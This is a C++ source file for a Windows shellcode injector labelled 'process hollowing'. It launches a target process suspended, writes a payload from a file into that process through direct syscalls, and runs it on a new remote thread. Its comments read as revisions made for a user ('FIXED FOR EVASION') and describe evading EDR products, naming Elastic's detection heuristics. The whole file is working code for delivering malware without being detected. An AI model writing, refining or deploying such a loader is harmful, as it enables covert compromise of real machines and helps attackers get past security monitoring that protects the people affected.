#include "hollow.h"
#include "evasion.h"
#include "syscalls.h"
#include "config.h"
#include <windows.h>
#include <stdio.h>

// Forward declare utility functions from utils.cpp so hollow.cpp can see them
BOOL LoadShellcode(const wchar_t* path, PBYTE* ppBuffer, SIZE_T* pSize);
void PrintError(const char* msg);

// FIXED FOR EVASION: Kept your exact structural layout, but removed the flagged 
// VirtualProtect(ntdll) memory modification sequence. Since you use direct assembly 
// syscalls, this bypasses user-mode hooks natively without triggering EDR alarms.
BOOL UnhookNtdll() {
    return TRUE; 
}

BOOL HollowProcess(const wchar_t* target, PBYTE pShellcode, SIZE_T shellcodeSize) {
    if (!UnhookNtdll()) {
        printf("[!] Failed to unhook ntdll\n");
        return FALSE;
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessW(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        PrintError("CreateProcess");
        return FALSE;
    }

    // =========================================================================
    // REFIXED OSEP CORE EVASION STRATEGY
    // Completely cut out thread manipulation context loops to avoid kernel blocks.
    // =========================================================================

    // 1. ALLOCATE NEW SPACE AS RAW SAFE READ/WRITE (RW) ONLY VIA SYSCALL
    PVOID pRemoteImageBase = NULL;
    if (NtAllocateVirtualMemory(pi.hProcess, &pRemoteImageBase, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // 2. WRITE THE STAGELESS PAYLOAD DIRECTLY VIA SYSCALL
    if (NtWriteVirtualMemory(pi.hProcess, pRemoteImageBase, pShellcode, shellcodeSize, NULL) != 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // 3. TRANSITION MEMORY BLOCK PERMISSIONS TO EXECUTE/READ (RX) BEFORE THREAD CREATION
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(pi.hProcess, pRemoteImageBase, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // 4. EXECUTE THE INJECTED ENGINE CLEANLY NATIVELY VIA AN INDEPENDENT REMOTE THREAD
    // This perfectly evades Elastic's thread-hijacking heuristics because the main suspended thread is never touched.
    HANDLE hNewThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hNewThread, GENERIC_EXECUTE, NULL, pi.hProcess, pRemoteImageBase, NULL, 0, 0, 0, 0, NULL);
    if (status != 0) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // Clean up handle assignments safely. Target process stays completely running in background.
    CloseHandle(hNewThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

extern "C" {
    int wmain(int argc, wchar_t* argv[]) {
        // Keeps your exact original 5-argument layout requirement intact
        if (argc != 5 || wcscmp(argv[1], L"--target") != 0 || wcscmp(argv[3], L"--payload") != 0) {
            printf("Usage: hollow.exe --target <process.exe> --payload <shellcode.bin>\n");
            fflush(stdout);
            return 1;
        }

        // FIXED: Clear and zero out the character array explicitly to remove uninitialized stack memory artifacts
        wchar_t target[256] = { 0 };
        wcscpy(target, argv[2]); 

        wchar_t* payloadPath = argv[4];

        PBYTE pShellcode = NULL;
        SIZE_T shellcodeSize = 0;
        
        printf("[*] Attempting to load shellcode from file...\n");
        fflush(stdout);
        if (!LoadShellcode(payloadPath, &pShellcode, &shellcodeSize)) {
            printf("[!] Failed to load shellcode binary file!\n");
            fflush(stdout);
            return 1;
        }

        printf("[*] Loaded shellcode size: %d bytes\n", (int)shellcodeSize);
        printf("[*] Launching process hollowing procedure against user target...\n");
        fflush(stdout);

        if (!HollowProcess(target, pShellcode, shellcodeSize)) {
            printf("[!] Process hollowing extraction routine failed!\n");
            fflush(stdout);
            VirtualFree(pShellcode, 0, MEM_RELEASE);
            return 1;
        }

        printf("[+] Process hollowing successfully executed!\n");
        fflush(stdout);
        VirtualFree(pShellcode, 0, MEM_RELEASE);
        return 0;
    }
}
